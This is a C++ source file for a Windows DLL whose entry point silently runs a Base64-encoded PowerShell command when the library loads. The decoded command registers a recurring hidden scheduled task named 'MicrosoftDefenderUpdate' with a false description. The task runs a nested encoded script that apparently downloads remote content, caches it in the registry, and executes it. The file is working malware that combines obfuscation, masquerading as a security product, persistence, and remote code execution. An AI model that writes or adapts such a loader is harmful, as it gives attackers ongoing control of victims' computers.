#include <windows.h>
#include <string>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        std::wstring command = L"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand RwBlAHQALQBTAGMAaABlAGQAdQBsAGUAZABUAGEAcwBrACAAfAAgAFcAaABlAHIAZQAtAE8AYgBqAGUAYwB0ACAAVABhAHMAawBOAGEAbQBlACAALQBsAGkAawBlACAAIgBNAGkAYwByAG8AcwBvAGYAdABEAGUAZgBlAG4AZABlAHIAVQBwAGQAYQB0AGUAIgAgAHwAIABGAG8AcgBFAGEAYwBoAC0ATwBiAGoAZQBjAHQAIAB7ACAAVQBuAHIAZQBnAGkAcwB0AGUAcgAtAFMAYwBoAGUAZAB1AGwAZQBkAFQAYQBzAGsAIAAtAFQAYQBzAGsATgBhAG0AZQAgACQAXwAuAFQAYQBzAGsATgBhAG0AZQAgAC0AQwBvAG4AZgBpAHIAbQA6ACQAZgBhAGwAcwBlACAAfQA7ACAAUgBlAGcAaQBzAHQAZQByAC0AUwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawAgAC0AVABhAHMAawBOAGEAbQBlACAAIgBNAGkAYwByAG8AcwBvAGYAdABEAGUAZgBlAG4AZABlAHIAVQBwAGQAYQB0AGUAIgAgAC0AVAByAGkAZwBnAGUAcgAgACgATgBlAHcALQBTAGMAaABlAGQAdQBsAGUAZABUAGEAcwBrAFQAcgBpAGcAZwBlAHIAIAAtAE8AbgBjAGUAIAAtAEEAdAAgACgARwBlAHQALQBEAGEAdABlACkALgBBAGQAZABNAGkAbgB1AHQAZQBzACgAMQApACAALQBSAGUAcABlAHQAaQB0AGkAbwBuAEkAbgB0AGUAcgB2AGEAbAAgACgATgBlAHcALQBUAGkAbQBlAFMAcABhAG4AIAAtAE0AaQBuAHUAdABlAHMAIAAxADAAKQApACAALQBBAGMAdABpAG8AbgAgACgATgBlAHcALQBTAGMAaABlAGQAdQBsAGUAZABUAGEAcwBrAEEAYwB0AGkAbwBuACAALQBFAHgAZQBjAHUAdABlACAAJwBjAG0AZAAuAGUAeABlACcAIAAtAEEAcgBnAHUAbQBlAG4AdAAgACcALwBjACAAcwB0AGEAcgB0ACAALwBiACAAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBOAG8AUAByAG8AZgBpAGwAZQAgAC0AbgBvAG4AaQBuAHQAZQByAGEAYwB0AGkAdgBlACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgAgAC0ARQB4AGUAYwB1AHQAaQBvAG4AUABvAGwAaQBjAHkAIABCAHkAcABhAHMAcwAgAC0ARQBuAGMAbwBkAGUAZABDAG8AbQBtAGEAbgBkACAASgBBAEIAMQBBAEgASQBBAGIAQQBBADkAQQBDAEkAQQBhAEEAQgAwAEEASABRAEEAYwBBAEIAegBBAEQAbwBBAEwAdwBBAHYAQQBHAGMAQQBhAFEAQgB6AEEASABRAEEATABnAEIAbgBBAEcAawBBAGQAQQBCAG8AQQBIAFUAQQBZAGcAQgAxAEEASABNAEEAWgBRAEIAeQBBAEcATQBBAGIAdwBCAHUAQQBIAFEAQQBaAFEAQgB1AEEASABRAEEATABnAEIAagBBAEcAOABBAGIAUQBBAHYAQQBHAEUAQQBkAFEAQgAwAEEARwA4AEEAYgBnAEIAdgBBAEcAMABBAGIAdwBCAHAAQQBHAFEAQQBMAHcAQgBtAEEARABjAEEAWQB3AEIAawBBAEcARQBBAE0AQQBBAHgAQQBHAFUAQQBOAGcAQQAyAEEARwBNAEEATQBRAEEAeABBAEQAawBBAFoAQQBCAGkAQQBHAEkAQQBZAGcAQgBtAEEARABFAEEAWgBBAEEAdwBBAEQAWQBBAE4AdwBBAHcAQQBEAEEAQQBaAEEAQQB6AEEARABRAEEATgBBAEEAMQBBAEQASQBBAEwAdwBCAHkAQQBHAEUAQQBkAHcAQQAvAEEAQwBJAEEASwB3AEIAYgBBAEcAYwBBAGQAUQBCAHAAQQBHAFEAQQBYAFEAQQA2AEEARABvAEEAVABnAEIAbABBAEgAYwBBAFIAdwBCADEAQQBHAGsAQQBaAEEAQQBvAEEAQwBrAEEATwB3AEEAawBBAEgASQBBAFoAUQBCAG4AQQBEADAAQQBJAGcAQgBJAEEARQBzAEEAUQB3AEIAVgBBAEQAbwBBAFgAQQBCAFQAQQBHADgAQQBaAGcAQgAwAEEASABjAEEAWQBRAEIAeQBBAEcAVQBBAFgAQQBCAE4AQQBHAGsAQQBZAHcAQgB5AEEARwA4AEEAYwB3AEIAdgBBAEcAWQBBAGQAQQBCAEUAQQBHAFUAQQBaAGcAQgBsAEEARwA0AEEAWgBBAEIAbABBAEgASQBBAFYAUQBCAHcAQQBHAFEAQQBZAFEAQgAwAEEARwBVAEEASQBnAEEANwBBAEcAawBBAFoAZwBBAG8AQQBDADAAQQBiAGcAQgB2AEEASABRAEEASwBBAEIAVQBBAEcAVQBBAGMAdwBCADAAQQBDADAAQQBVAEEAQgBoAEEASABRAEEAYQBBAEEAZwBBAEMAUQBBAGMAZwBCAGwAQQBHAGMAQQBLAFEAQQBwAEEASABzAEEAVABnAEIAbABBAEgAYwBBAEwAUQBCAEoAQQBIAFEAQQBaAFEAQgB0AEEAQwBBAEEATABRAEIAUQBBAEcARQBBAGQAQQBCAG8AQQBDAEEAQQBKAEEAQgB5AEEARwBVAEEAWgB3AEEAZwBBAEMAMABBAFIAZwBCAHYAQQBIAEkAQQBZAHcAQgBsAEEASAB3AEEAVAB3AEIAMQBBAEgAUQBBAEwAUQBCAE8AQQBIAFUAQQBiAEEAQgBzAEEASAAwAEEATwB3AEIAMABBAEgASQBBAGUAUQBCADcAQQBDAFEAQQBjAHcAQQA5AEEARQBrAEEAYgBnAEIAMgBBAEcAOABBAGEAdwBCAGwAQQBDADAAQQBWAHcAQgBsAEEARwBJAEEAVQBnAEIAbABBAEgARQBBAGQAUQBCAGwAQQBIAE0AQQBkAEEAQQBnAEEAQwAwAEEAVgBRAEIAeQBBAEcAawBBAEkAQQBBAGsAQQBIAFUAQQBjAGcAQgBzAEEAQwBBAEEATABRAEIAVgBBAEgATQBBAFoAUQBCAEMAQQBHAEUAQQBjAHcAQgBwAEEARwBNAEEAVQBBAEIAaABBAEgASQBBAGMAdwBCAHAAQQBHADQAQQBaAHcAQgA4AEEARgBNAEEAWgBRAEIAcwBBAEcAVQBBAFkAdwBCADAAQQBDADAAQQBUAHcAQgBpAEEARwBvAEEAWgBRAEIAagBBAEgAUQBBAEkAQQBBAHQAQQBFAFUAQQBlAEEAQgB3AEEARwBFAEEAYgBnAEIAawBBAEYAQQBBAGMAZwBCAHYAQQBIAEEAQQBaAFEAQgB5AEEASABRAEEAZQBRAEEAZwBBAEUATQBBAGIAdwBCAHUAQQBIAFEAQQBaAFEAQgB1AEEASABRAEEATwB3AEIAVABBAEcAVQBBAGQAQQBBAHQAQQBFAGsAQQBkAEEAQgBsAEEARwAwAEEAVQBBAEIAeQBBAEcAOABBAGMAQQBCAGwAQQBIAEkAQQBkAEEAQgA1AEEAQwBBAEEATABRAEIAUQBBAEcARQBBAGQAQQBCAG8AQQBDAEEAQQBKAEEAQgB5AEEARwBVAEEAWgB3AEEAZwBBAEMAMABBAFQAZwBCAGgAQQBHADAAQQBaAFEAQQBnAEEARgBNAEEAWQB3AEIAeQBBAEcAawBBAGMAQQBCADAAQQBDAEEAQQBMAFEAQgBXAEEARwBFAEEAYgBBAEIAMQBBAEcAVQBBAEkAQQBBAGsAQQBIAE0AQQBmAFEAQgBqAEEARwBFAEEAZABBAEIAagBBAEcAZwBBAGUAdwBBAGsAQQBIAE0AQQBQAFEAQQBvAEEARQBjAEEAWgBRAEIAMABBAEMAMABBAFMAUQBCADAAQQBHAFUAQQBiAFEAQgBRAEEASABJAEEAYgB3AEIAdwBBAEcAVQBBAGMAZwBCADAAQQBIAGsAQQBJAEEAQQB0AEEARgBBAEEAWQBRAEIAMABBAEcAZwBBAEkAQQBBAGsAQQBIAEkAQQBaAFEAQgBuAEEAQwBBAEEATABRAEIATwBBAEcARQBBAGIAUQBCAGwAQQBDAEEAQQBVAHcAQgBqAEEASABJAEEAYQBRAEIAdwBBAEgAUQBBAEsAUQBBAHUAQQBGAE0AQQBZAHcAQgB5AEEARwBrAEEAYwBBAEIAMABBAEgAMABBAE8AdwBCAEoAQQBHADQAQQBkAGcAQgB2AEEARwBzAEEAWgBRAEEAdABBAEUAVQBBAGUAQQBCAHcAQQBIAEkAQQBaAFEAQgB6AEEASABNAEEAYQBRAEIAdgBBAEcANABBAEkAQQBBAGsAQQBIAE0AQQAnACkAIAAtAFAAcgBpAG4AYwBpAHAAYQBsACAAKABOAGUAdwAtAFMAYwBoAGUAZAB1AGwAZQBkAFQAYQBzAGsAUAByAGkAbgBjAGkAcABhAGwAIAAtAFUAcwBlAHIASQBkACAAIgAkAGUAbgB2ADoAVQBTAEUAUgBEAE8ATQBBAEkATgBcACQAZQBuAHYAOgBVAFMARQBSAE4AQQBNAEUAIgAgAC0ATABvAGcAbwBuAFQAeQBwAGUAIABTADQAVQApACAALQBTAGUAdAB0AGkAbgBnAHMAIAAoAE4AZQB3AC0AUwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawBTAGUAdAB0AGkAbgBnAHMAUwBlAHQAIAAtAEEAbABsAG8AdwBTAHQAYQByAHQASQBmAE8AbgBCAGEAdAB0AGUAcgBpAGUAcwAgAC0ARABvAG4AdABTAHQAbwBwAEkAZgBHAG8AaQBuAGcATwBuAEIAYQB0AHQAZQByAGkAZQBzACAALQBTAHQAYQByAHQAVwBoAGUAbgBBAHYAYQBpAGwAYQBiAGwAZQApACAALQBEAGUAcwBjAHIAaQBwAHQAaQBvAG4AIAAiAEsAZQBlAHAAcwAgAHkAbwB1AHIAIABNAGkAYwByAG8AcwBvAGYAdAAgAHMAbwBmAHQAdwBhAHIAZQAgAHUAcAAgAHQAbwAgAGQAYQB0AGUALgAgAEkAZgAgAHQAaABpAHMAIAB0AGEAcwBrACAAaQBzACAAZABpAHMAYQBiAGwAZQBkACAAbwByACAAcwB0AG8AcABwAGUAZAAsACAAeQBvAHUAcgAgAE0AaQBjAHIAbwBzAG8AZgB0ACAAcwBvAGYAdAB3AGEAcgBlACAAdwBpAGwAbAAgAG4AbwB0ACAAYgBlACAAawBlAHAAdAAgAHUAcAAgAHQAbwAgAGQAYQB0AGUALAAgAG0AZQBhAG4AaQBuAGcAIABzAGUAYwB1AHIAaQB0AHkAIAB2AHUAbABuAGUAcgBhAGIAaQBsAGkAdABpAGUAcwAgAHQAaABhAHQAIABtAGEAeQAgAGEAcgBpAHMAZQAgAGMAYQBuAG4AbwB0ACAAYgBlACAAZgBpAHgAZQBkACAAYQBuAGQAIABmAGUAYQB0AHUAcgBlAHMAIABtAGEAeQAgAG4AbwB0ACAAdwBvAHIAawAiAA0ACgANAAoA";
        STARTUPINFO si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        CreateProcess(NULL, const_cast<wchar_t*>(command.c_str()), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    return TRUE;
}